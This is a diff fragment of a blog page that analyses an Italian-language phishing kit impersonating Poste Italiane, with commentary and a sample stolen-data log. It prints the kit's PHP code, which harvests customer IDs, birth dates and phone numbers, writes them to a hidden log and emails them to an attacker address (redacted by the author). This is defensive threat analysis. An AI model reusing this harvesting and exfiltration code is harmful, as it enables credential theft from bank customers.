+</span></span></code></pre></div><p>This section is taking the parameters sent from <code>login.php</code> and assigning them to variables with Italian names, so far we have assigned data for the customer ID, the day, the month and the year of the specified birth date.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txt&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $telefono <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txt&#39;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">require</span> <span style="color:#e6db74">&#34;includes/my_email.php&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">date_default_timezone_set</span>(<span style="color:#e6db74">&#39;Europe/London&#39;</span>);
+</span></span><span style="display:flex;"><span>    $ip <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>];
+</span></span><span style="display:flex;"><span>    $time <span style="color:#f92672">=</span> <span style="color:#a6e22e">date</span>(<span style="color:#e6db74">&#34;m-d-Y g:i:a&#34;</span>);
+</span></span><span style="display:flex;"><span>    $agent <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;HTTP_USER_AGENT&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;+ ------------------------------------------+</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;+ Dati Login per </span><span style="color:#e6db74">$username\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;+ ------------------------------------------+</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;| codcliente: &#34;</span><span style="color:#f92672">.</span>$codclient<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;| giorno: &#34;</span><span style="color:#f92672">.</span>$giorno<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;| mese: &#34;</span><span style="color:#f92672">.</span>$mese<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;| anno: &#34;</span><span style="color:#f92672">.</span>$anno<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;| telefono: &#34;</span><span style="color:#f92672">.</span>$telefono<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $footer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;+ ------------------------------------------+</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $footer <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;+ Sent from </span><span style="color:#e6db74">$v_ip</span><span style="color:#e6db74"> on </span><span style="color:#e6db74">$time</span><span style="color:#e6db74"> via </span><span style="color:#e6db74">$agent\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $footer <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;+ ------------------------------------------+</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $data <span style="color:#f92672">=</span> $msg <span style="color:#f92672">.</span> $footer;
+</span></span><span style="display:flex;"><span>    $_SESSION[<span style="color:#e6db74">&#39;login_info&#39;</span>] <span style="color:#f92672">=</span> $msg;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;*********&#34;</span>, <span style="color:#e6db74">&#34;a&#34;</span>); <span style="color:#75715e">// HIDING LOG FILE
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">fputs</span>($fp,$data);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>($fp);
+</span></span><span style="display:flex;"><span>    $subject <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Poste Login Info for User: </span><span style="color:#e6db74">$username</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $headers <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;From: Poste Login Info &lt;</span><span style="color:#e6db74">$my_email</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $headers <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Reply-To: Poste Login Info &lt;</span><span style="color:#e6db74">$my_email</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $headers <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;MIME-Version: 1.0</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $headers <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Content-Type: text/plain; charset=utf-8</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mail</span>($my_email,$subject,$data,$headers);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>After assigning the last bit of information coming from <code>login.php</code> (the phone number) the code is now preparing the email to exfiltrate the data. The kit is taking the exfiltration email from <code>includes/my_email.php</code> and then logging the stolen credentials in a txt file (I am not disclosing the path to prevent malicious actors to re-use the stolen credentials).</p>
 <p>Below you can find <code>my_email.php</code> (I have replaced the Gmail address with the asterisks):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-$my_email <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;***********@gmail.com&#34;</span>; <span style="color:#75715e">//////// YOUR EMAIL GOES HERE
-</span><span style="color:#75715e"></span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><p>The comment <em>&ldquo;YOUR EMAIL GOES HERE&rdquo;</em> may suggest that there are two different actors involved in this activity: one is developing the kit, while another malicious actor is using it. This may explain why there are instructions left in comments around the code base.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$my_email <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;***********@gmail.com&#34;</span>; <span style="color:#75715e">//////// YOUR EMAIL GOES HERE
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>The comment <em>&ldquo;YOUR EMAIL GOES HERE&rdquo;</em> may suggest that there are two different actors involved in this activity: one is developing the kit, while another malicious actor is using it. This may explain why there are instructions left in comments around the code base.</p>
 <p>Here is the content of the txt log file, which contains a sample of the data that the criminal will receive via email:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">+ ------------------------------------------+
-+ Dati Login per
-+ ------------------------------------------+
-| codcliente: 1111111
-| giorno: 11
-| mese: 01
-| anno: 1111
-| telefono: 111111111111
-+ ------------------------------------------+
-+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
-+ ------------------------------------------+
-
-+ ------------------------------------------+
-+ Dati Login per
-+ ------------------------------------------+
-| pin: 1111111
-+ ------------------------------------------+
-+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
-+ ------------------------------------------+
-
-+ ------------------------------------------+
-+ Dati Login per
-+ ------------------------------------------+
-| otp: 1111111
-+ ------------------------------------------+
-+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
-+ ------------------------------------------+
-
-+ ------------------------------------------+
-+ Dati Login per
-+ ------------------------------------------+
-| domanda1: 1111111
-| domanda2: 1111111
-| domanda3: 1111111
-+ ------------------------------------------+
-+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
-+ ------------------------------------------+
-</code></pre></div><p>We can also see a User-Agent string exposed in the log above, which may suggest what platform and browser the criminal is using to develop the kit (Chrome 88 on Windows 8).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>+ ------------------------------------------+
+</span></span><span style="display:flex;"><span>+ Dati Login per
+</span></span><span style="display:flex;"><span>+ ------------------------------------------+
+</span></span><span style="display:flex;"><span>| codcliente: 1111111
+</span></span><span style="display:flex;"><span>| giorno: 11
+</span></span><span style="display:flex;"><span>| mese: 01
+</span></span><span style="display:flex;"><span>| anno: 1111
+</span></span><span style="display:flex;"><span>| telefono: 111111111111
+</span></span><span style="display:flex;"><span>+ ------------------------------------------+
+</span></span><span style="display:flex;"><span>+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+</span></span><span style="display:flex;"><span>+ ------------------------------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>+ ------------------------------------------+
+</span></span><span style="display:flex;"><span>+ Dati Login per
+</span></span><span style="display:flex;"><span>+ ------------------------------------------+
+</span></span><span style="display:flex;"><span>| pin: 1111111
+</span></span><span style="display:flex;"><span>+ ------------------------------------------+
+</span></span><span style="display:flex;"><span>+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+</span></span><span style="display:flex;"><span>+ ------------------------------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>+ ------------------------------------------+
+</span></span><span style="display:flex;"><span>+ Dati Login per
+</span></span><span style="display:flex;"><span>+ ------------------------------------------+
+</span></span><span style="display:flex;"><span>| otp: 1111111
+</span></span><span style="display:flex;"><span>+ ------------------------------------------+
+</span></span><span style="display:flex;"><span>+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+</span></span><span style="display:flex;"><span>+ ------------------------------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>+ ------------------------------------------+
+</span></span><span style="display:flex;"><span>+ Dati Login per
+</span></span><span style="display:flex;"><span>+ ------------------------------------------+
+</span></span><span style="display:flex;"><span>| domanda1: 1111111
+</span></span><span style="display:flex;"><span>| domanda2: 1111111
+</span></span><span style="display:flex;"><span>| domanda3: 1111111
+</span></span><span style="display:flex;"><span>+ ------------------------------------------+
+</span></span><span style="display:flex;"><span>+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+</span></span><span style="display:flex;"><span>+ ------------------------------------------+
+</span></span></code></pre></div><p>We can also see a User-Agent string exposed in the log above, which may suggest what platform and browser the criminal is using to develop the kit (Chrome 88 on Windows 8).</p>
 <h3 id="the-big-picture">The big picture</h3>
 <p>Based on the logs pasted previously, it&rsquo;s easy to have an idea of how the kit works:</p>
 <ol>
@@ -488,7 +488,7 @@ $my_email <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;
     
       
         
-        <script src="/js/dark-mode.min.aee9c8a464eb7b3534c7110f7c5e169e7039e2fd92710e0626d451d6725af137.js"></script>
+        <script src="/js/dark-mode.min.c2d8a1f8f2660e4a46d776277c72695a1e0ca65939d79f754441d47551604af5.js"></script>
       
     
 
